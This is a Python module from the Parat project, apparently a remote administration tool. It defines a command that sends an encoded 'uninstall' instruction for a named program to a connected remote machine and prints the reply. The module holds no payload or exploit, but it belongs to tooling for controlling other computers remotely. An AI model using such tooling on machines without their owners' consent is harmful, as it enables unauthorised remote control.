#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

from time import sleep
from lib.ParatPrint import colorize, pprint, gray
from lib.ParatEncrypt import Encode, Decode
from lib.ProcessThread import ParatProcessBar


class ParatUninstall:

    def __init__(self, conn, program, colors):

        self.conn      = conn
        self.program   = program
        self.colors    = colors


    def start(self):

        if len(self.program) == 0:
            pprint(
                colorize(
                    "usage: uninstall 'Adobe Acrobat Reader DC'\n",
                    colored=self.colors,
                    status="INF"
                ))

        else:

            text = colorize(
                "tring for uninstall",
                colored=self.colors,
                status="INF"
            )
            process_bar = ParatProcessBar(text)
            process_bar.start_process()

            self.conn.send(Encode("uninstall<#>" + self.program[0]))
            result = Decode(self.conn.recv(4096))

            process_bar.Stop = True
            sleep(0.2)
            pprint(result) if self.colors else pprint(gray(result))
